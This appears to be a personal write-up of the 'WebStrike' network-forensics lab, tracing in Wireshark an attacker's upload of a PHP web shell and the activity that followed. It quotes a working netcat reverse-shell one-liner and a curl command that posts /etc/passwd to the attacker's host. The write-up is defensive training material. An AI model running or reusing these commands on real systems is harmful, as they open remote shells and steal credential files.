# WebStrike Lab

## Objective:

Task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorized activity.

### Skills Learned

1. Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?
2. Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?
3. We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?
4. Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?
5. Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?
6. Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?

### Tools Used

- Wireshark
- ipgeolocation.io

## Steps:

1. Navigate to the WebStrike.PCAP file that was captured.  <a href="https://github.com/emveexd/WebStrike-Lab"> *Ref 1: WebStrike.PCAP file </a>
2. Perform an IPv4 Address Lookup of ---| 117.11.88.124 |. 
3. Identify the User-Agent ---| Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 |.
4. Create a filter for Wireshark ---| (ip.src == 117.11.88.124 and http.request.method=="POST") |.
5. Identify any successful uploads ---| "image.jpg.php" uploaded successfully |.
6. Locate the file location of the uploaded file ---| /reviews/uploads/ |.
7. Identify the targeted Port used for infiltration ---| Port 8080 |.
8. Create a filter for Wireshark ---| (tcp.port==8080) && (ip.src==24.49.63.79) |.
9. Identify the commands used for exfiltration ---| "curl" "curl -X POST -d /etc/passwd 117.11.88.124:443" |.
10. Identified the critical information containing sensitive user configuration data.

drag & drop screenshots here or use imgur and reference them using imgsrc

Every screenshot should have some text explaining what the screenshot is about.

Example below.

*Ref 1: WebStrike.PCAP file

## Notes:

- Thunar file system interaction
- https://ipgeolocation.io/   for IPv4v Address (117.11.88.124) Lookup
- WebStrike.PCAP
- uese-agent ---- | Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 |
- Filter for wire shark ---- |(ip.src == 117.11.88.124 and http.request.method=="POST") |
- "image.jpg.php" uploaded successfully
- ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f")
- Uploaded file found in /reviews/uploads/
- Port 8080 targeted
- Filter for wire shark ---- | (tcp.port==8080) && (ip.src==24.49.63.79) |
- Attacker used "curl" "curl -X POST -d /etc/passwd 117.11.88.124:443/"
- Shows exfiltration of critical information containing sensitive user configuration data.
- 
